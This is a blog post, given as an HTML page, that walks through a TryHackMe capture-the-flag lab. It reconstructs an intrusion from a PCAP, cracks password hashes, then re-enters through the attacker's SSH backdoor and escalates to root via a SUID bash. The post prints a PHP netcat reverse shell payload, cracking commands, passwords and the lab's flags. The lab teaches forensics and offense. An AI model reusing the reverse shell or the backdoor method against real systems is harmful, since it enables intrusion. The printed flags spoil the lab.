@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Overpass 2: Hacked | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: PCAP forensics to reconstruct a kill chain, John and hashcat to crack system and backdoor passwords, then re-exploit via the attacker's own SSH backdoor and SUID bash to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/overpass-2-hacked.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/overpass-2-hacked.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Overpass 2: Hacked">
+<meta property="og:description" content="TryHackMe CTF: PCAP forensics to reconstruct a kill chain, John and hashcat to crack system and backdoor passwords, then re-exploit via the attacker's own SSH backdoor and SUID bash to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Overpass 2: Hacked">
+<meta name="twitter:description" content="TryHackMe CTF: PCAP forensics to reconstruct a kill chain, John and hashcat to crack system and backdoor passwords, then re-exploit via the attacker's own SSH backdoor and SUID bash to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Overpass 2: Hacked</h1>
+    <div class="post-description">TryHackMe CTF. Overpass has been breached. DFIR first: trace the kill chain through a PCAP. Then OffSec: use the attacker&rsquo;s own backdoor to walk back in.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Overpass has been breached. The SOC team caught the attack mid-action and grabbed a PCAP. The job: trace the kill chain through the capture, then turn around and re-exploit the server using what the attacker left behind.</p>
+
+<p>Two halves. First, work out how they got in. Then walk the same path back into the box.</p>
+
+<hr>
+
+<h2>Forensics: analyze the PCAP</h2>
+
+<p>First items to inspect are the HTTP packets. Unencrypted plaintext is the juice that&rsquo;s worth the squeeze.</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 7.18.58 AM.png" alt="Wireshark HTTP packet list, packet 27 highlighted showing promising URL" style="max-width:100%;margin:2rem 0;">
+
+<p>The URL highlighted in packet 27 looks promising. The packets leading up to it carry critical communication about the payload URL.</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 7.27.39 AM.png" alt="Wireshark packet detail showing upload page URL in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Upload page:</strong> <code>/development/</code></p>
+
+<p>Let&rsquo;s formally sort out what we&rsquo;re looking for. In Wireshark:</p>
+
+<pre><code>http.request.method == "POST"</code></pre>
+
+<p>Filter for POST requests to isolate the payload upload. Packet 14 shows the POST to the upload page.</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 7.38.53 AM.png" alt="Wireshark filtered to POST requests, packet 14 highlighted showing upload to /development/" style="max-width:100%;margin:2rem 0;">
+
+<p>Time to follow the conversation. Right-click a TCP packet in the stream, then <code>Follow</code> then <code>TCP Stream</code> or <code>HTTP Stream</code>.</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 7.50.14 AM.png" alt="Wireshark TCP stream 1 showing the HTTP exchange in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 7.57.49 AM.png" alt="Wireshark TCP stream showing the PHP reverse shell payload in the upload body" style="max-width:100%;margin:2rem 0;">
+
+<p>The TCP packets literally speak for themselves.</p>
+
+<p><strong>Payload:</strong></p>
+<pre><code class="language-php">&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;</code></pre>
+
+<p>Classic PHP reverse shell, caught by a netcat listener on the attacker&rsquo;s box. The full exploit exchange is visible in plaintext across the streams.</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 8.03.59 AM.png" alt="Wireshark stream showing the reverse shell session in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p>I had to walk the filter from TCP stream 1 up to stream 2, then 3, to follow the conversation through its path.</p>
+
+<p>The attacker then escalated. <code>sudo</code> to access <code>/etc/shadow</code>:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 8.13.24 AM.png" alt="Wireshark stream showing sudo command and /etc/shadow contents" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Privesc password:</strong> <code>whenevernoteartinstant</code></p>
+
+<p>Then cloned a GitHub repo of an SSH backdoor:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 8.12.32 AM.png" alt="Wireshark stream showing git clone of the ssh-backdoor repository" style="max-width:100%;margin:2rem 0;">
+
+<p>This hacker has moves.</p>
+
+<p><strong>Persistence:</strong> <code>https://github.com/NinjaJc01/ssh-backdoor</code></p>
+
+<hr>
+
+<h2>Cracking the system passwords</h2>
+
+<p>Copy the contents of <code>/etc/shadow</code> to a local file:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 8.59.28 AM.png" alt="/etc/shadow contents copied to local file for offline cracking" style="max-width:100%;margin:2rem 0;">
+
+<p>Then call our friend John. Mr. Ripper, if you prefer formalities.</p>
+
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/fasttrack.txt etc_shadow.txt</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 9.04.35 AM.png" alt="John the Ripper output showing cracked passwords from /etc/shadow" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Crackable system passwords:</strong> 4</p>
+
+<hr>
+
+<h2>Analyze the SSH backdoor</h2>
+
+<p>Clone the repo in a sandboxed environment.</p>
+
+<pre><code class="language-bash">git clone https://github.com/NinjaJc01/ssh-backdoor.git
+cd ssh-backdoor</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 9.44.24 AM.png" alt="ssh-backdoor repository cloned and directory listing showing main.go" style="max-width:100%;margin:2rem 0;">
+
+<p>Glad I&rsquo;ve been learning and building in Go lately.</p>
+
+<p>Inside <code>main.go</code>, two key values stand out. The default hash for the backdoor:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 11.59.50 AM.png" alt="main.go showing the default hash hardcoded in the backdoor source" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Default hash:</strong> <code>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></p>
+
+<p>And the hardcoded salt:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 9.46.15 AM.png" alt="main.go showing the hardcoded salt value" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Hardcoded salt:</strong> <code>1c362db832f3f864c8c2fe05f2002a05</code></p>
+
+<p>Yet again, I find myself very thankful for the Sec+ courses at CIAT. The lectures on salting, peppering, cryptographics, and obfuscation resonated deeply. During hashing, salt is extra characters added into the mix. Without the exact salt, you cannot produce the same hash even if you have the exact password. You need both verbatim: password and salt. With those, you can hashcat your way to a password.</p>
+
+<p>Now to locate the hash the attacker actually used. Right below the SSH key&rsquo;s randomart (which I affectionately call the &ldquo;SSH Gumball Machines,&rdquo; because why not live a little), the hash used during initial backdoor access:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 10.03.47 AM.png" alt="PCAP stream showing the attacker's hash used when setting up the backdoor" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Attacker&rsquo;s hash:</strong> <code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></p>
+
+<hr>
+
+<h2>Cracking the attacker&rsquo;s hash</h2>
+
+<p>Paste the attacker&rsquo;s hash into a text file. Do not hit space, do not hit enter. Type a colon, then paste the hardcoded salt:</p>
+
+<pre><code>ATTACKER_HASH:1c362db832f3f864c8c2fe05f2002a05</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.00.03 PM.png" alt="Text file with hash:salt formatted for hashcat input" style="max-width:100%;margin:2rem 0;">
+
+<p>Save and exit. Then hashcat:</p>
+
+<pre><code class="language-bash">hashcat -m 1710 operation_crack.txt /usr/share/wordlists/rockyou.txt -o operation_cracked.txt</code></pre>
+
+<p><code>-m 1710</code> tells hashcat to use SHA-512 (Unix).</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.04.41 PM.png" alt="hashcat running against the hash:salt pair" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.07.46 PM.png" alt="hashcat status showing crack complete" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat operation_cracked.txt</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.09.09 PM.png" alt="operation_cracked.txt showing the cracked password: november16" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Cracked password:</strong> <code>november16</code></p>
+
+<p>That ends the forensics. The kill chain is fully reconstructed. Now we use it.</p>
+
+<hr>
+
+<h2>OffSec pivot: back into the box</h2>
+
+<p>Paradox needs someone to take control of the production server before it gets formatted. The flags need pulling first.</p>
+
+<pre><code class="language-bash">nmap -sV -sC -p- -T4 TARGET_IP -oA overpass_nmap.txt</code></pre>
+
+<p>In-browser:</p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.21.48 PM.png" alt="Defaced Overpass website in browser, showing H4ck3d by CooctusClan" style="max-width:100%;margin:2rem 0;">
+
+<p>These hackers clearly haven&rsquo;t spent much time on Krita, Canva, or even Microsoft Paint. Go big or go home.</p>
+
+<p><strong>Defacement heading:</strong> <code>H4ck3d by CooctusClan</code></p>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.24.32 PM.png" alt="nmap results showing ports 22 SSH, 80 HTTP, and 2222 SSH backdoor open" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>22 SSH</li>
+<li>80 HTTP (defaced)</li>
+<li>2222 SSH (backdoor)</li>
+</ul>
+
+<p>Port 2222 is the backdoor the threat actor set up. Since he left us the keys, let&rsquo;s move on in.</p>
+
+<pre><code class="language-bash">ssh james@TARGET_IP -p 2222</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.45.12 PM.png" alt="SSH connection error due to legacy ssh-rsa host key type rejected by modern OpenSSH" style="max-width:100%;margin:2rem 0;">
+
+<p>The error means the server only offers the old <code>ssh-rsa</code> host key type, which modern OpenSSH disables by default. Workaround:</p>
+
+<pre><code class="language-bash">ssh -oHostKeyAlgorithms=+ssh-rsa james@TARGET_IP -p 2222</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.47.52 PM.png" alt="SSH login successful on port 2222 as james via the backdoor" style="max-width:100%;margin:2rem 0;">
+
+<p>We land in the <code>ssh-backdoor</code> directory. Head home and look around.</p>
+
+<pre><code class="language-bash">cd ~/
+ls -la</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.51.39 PM.png" alt="James' home directory listing showing .suid_bash in red with SUID permissions" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat user.txt</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 1.53.51 PM.png" alt="user.txt flag: thm{d119b4fa8c497ddb0525f7ad200e6567}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>thm{d119b4fa8c497ddb0525f7ad200e6567}</code></p>
+
+<hr>
+
+<h2>Privesc via SUID bash</h2>
+
+<p>The <code>.suid_bash</code> file in red is the giveaway. Permissions read <code>-rwsr-st-x</code>. The <code>s</code> tells us the binary runs with owner privileges. To the right of the permissions, instead of <code>james james</code>, it shows <code>root root</code>. The file is owned by root and SUID is set.</p>
+
+<p>If you ever want to scan a system for SUID files, put these in your toolkit:</p>
+
+<pre><code class="language-bash">find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null</code></pre>
+
+<p>For this case, GTFOBins handles the rest:</p>
+
+<pre><code class="language-bash">./.suid_bash -p</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 2.10.08 PM.png" alt=".suid_bash -p executed, dropping to a root shell" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat /root/root.txt</code></pre>
+
+<img src="/images/overpass-2-hacked/Screenshot 2026-06-07 at 2.13.29 PM.png" alt="root.txt flag: thm{d53b2684f169360bb9606c333873144d}" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>thm{d53b2684f169360bb9606c333873144d}</code></p>
+
+<p>A++. I really do love when I catch the confetti.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># === DFIR PHASE ===
+
+# 1. Inspect HTTP packets in Wireshark
+http.request.method == "POST"
+# -&gt; /development/ is the upload page, packet 27/14 show the POST
+
+# 2. Follow the TCP/HTTP stream of the upload
+tcp.stream eq 1
+# Right-click -&gt; Follow -&gt; TCP/HTTP Stream
+# Reveals the PHP reverse shell payload:
+# &lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;
+
+# 3. Walk later streams: attacker privesced via sudo (password: whenevernoteartinstant),
+#    read /etc/shadow, cloned https://github.com/NinjaJc01/ssh-backdoor for persistence.
+
+# 4. Crack /etc/shadow with John
+john --wordlist=/usr/share/wordlists/fasttrack.txt etc_shadow.txt
+# 4 passwords crackable
+
+# 5. Clone the backdoor repo and read main.go
+git clone https://github.com/NinjaJc01/ssh-backdoor.git
+# Default hash + hardcoded salt (1c362db832f3f864c8c2fe05f2002a05) visible in main.go
+
+# 6. Pull the attacker's hash from the PCAP, format hash:salt, crack with hashcat
+hashcat -m 1710 operation_crack.txt /usr/share/wordlists/rockyou.txt -o operation_cracked.txt
+# -&gt; november16
+
+# === OFFSEC PHASE ===
+
+# 7. Recon the production box
+nmap -sV -sC -p- -T4 TARGET_IP
+# 22, 80 (defaced "H4ck3d by CooctusClan"), 2222 (attacker's backdoor)
+
+# 8. SSH into the backdoor on 2222 (legacy key algo workaround)
+ssh -oHostKeyAlgorithms=+ssh-rsa james@TARGET_IP -p 2222
+cd ~/
+cat user.txt
+
+# 9. SUID bash privesc
+ls -la         # .suid_bash, root-owned, SUID set
+./.suid_bash -p
+cat /root/root.txt</code></pre>
+
+<p>Recap: PCAP analysis reconstructed the full attack (PHP reverse shell, sudo privesc, SSH backdoor persistence, hash extraction), then we used the attacker&rsquo;s own backdoor to walk back in, found a SUID bash they left behind, and escalated to root. Two flags pulled before formatting.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
